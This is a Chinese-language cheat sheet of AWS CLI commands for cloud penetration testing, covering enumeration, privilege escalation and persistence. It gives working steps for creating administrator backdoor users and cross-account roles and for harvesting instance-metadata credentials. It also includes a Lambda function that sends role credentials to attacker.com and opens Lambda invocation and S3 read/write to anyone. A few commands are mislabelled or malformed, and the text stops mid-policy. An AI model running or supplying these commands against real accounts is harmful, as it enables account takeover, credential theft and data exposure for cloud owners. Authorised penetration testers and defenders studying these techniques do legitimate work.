### 一、AWS CLI 渗透测试常用命令

#### 1. 信息收集与枚举

```bash

aws s3api get-bucket-policy --bucket <bucket-name>

# 列出所有 Lambda 函数

aws lambda get-function --function-name <function-name>

# 查看 Lambda 环境变量（可能含敏感信息）
aws lambda get-function-configuration --function-name <function-name> --query 'Environment.Variables'
```

#### 2. 权限提升

```bash
# ===== IAM 权限提升 =====
# 创建新的 IAM 用户（如果有 iam:CreateUser 权限）
aws iam create-user --user-name backdoor-user

# 创建访问密钥
aws iam create-access-key --user-name backdoor-user

# 附加管理员策略
aws iam attach-user-policy --user-name backdoor-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# ===== 角色权限提升 =====
# 尝试假设角色
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/MyRole \
  --role-session-name pentest-session

# 使用临时凭证
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# ===== EC2 实例角色利用 =====
# 在 EC2 实例上获取元数据中的角色凭证
# IMDSv1
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 获取角色名称
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>

# IMDSv2
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

# ===== Lambda 权限提升 =====
# 创建恶意 Lambda 函数窃取角色凭证
cat > steal_creds.py << 'EOF'
import json
import urllib.request
import os

def lambda_handler(event, context):
    # 获取角色凭证
    req = urllib.request.Request("http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI")
    creds = json.loads(urllib.request.urlopen(req).read())
    
    # 发送到攻击者服务器
    import urllib.parse
    data = urllib.parse.urlencode(creds).encode()
    req2 = urllib.request.Request("http://attacker.com/steal", data=data)
    urllib.request.urlopen(req2)
    
    return creds
EOF

zip steal_creds.zip steal_creds.py
aws lambda create-function --function-name steal-creds \
  --runtime python3.9 --role arn:aws:iam::123456789012:role/lambda-role \
  --handler steal_creds.lambda_handler --zip-file fileb://steal_creds.zip

aws lambda invoke --function-name steal-creds output.json
```

#### 3. 持久化

```bash
# 创建后门用户
aws iam create-user --user-name support-backdoor
aws iam create-access-key --user-name support-backdoor
aws iam attach-user-policy --user-name support-backdoor \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 创建后门角色（可从外部账户假设）
aws iam create-role --role-name support-role \
  --assume-role-policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Principal": { "AWS": "arn:aws:iam::ATTACKER-ACCOUNT:root" },
      "Action": "sts:AssumeRole"
    }]
  }'
aws iam attach-role-policy --role-name support-role \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 在 Lambda 中植入后门（事件触发）
aws lambda add-permission --function-name backdoor-function \
  --statement-id backdoor-invoke --action lambda:InvokeFunction \
  --principal "*" --statement-id public-invoke

# 创建 S3 桶策略后门（公开写入）
aws s3api put-bucket-policy --bucket sensitive-bucket \
  --policy '{
    "Version": "2012-10-17",
    "Statement": [{
      "Sid": "PublicRead",
      "Effect": "Allow",
      "Principal": "*",
      "Action": ["s3:GetObject", "s3:PutObject"],
      "Resource": "arn:aws:s3:::sensitive-bucket/*"
```
